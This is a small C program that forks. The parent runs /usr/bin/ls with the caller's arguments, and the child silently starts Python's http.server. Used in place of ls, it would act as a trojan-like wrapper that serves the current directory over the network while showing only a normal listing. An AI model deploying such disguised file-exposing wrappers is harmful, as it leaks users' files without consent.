#include<stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
    int pid = fork();

    if (pid > 0) {
        if (execvp("/usr/bin/ls", argv)<0) {
        }
    } else if (pid == 0)
    {
        char *args[] = {"/Library/Frameworks/Python.framework/Versions/3.10/bin/python3", "-m", "http.server", NULL};
        //        char *args[] = {"/bin/rs", NULL};
//          if (execvp("/bin/rs", args)<0) {
          if (execvp("/Library/Frameworks/Python.framework/Versions/3.10/bin/python3", args)<0) {
        }
    }

    return 0;
}
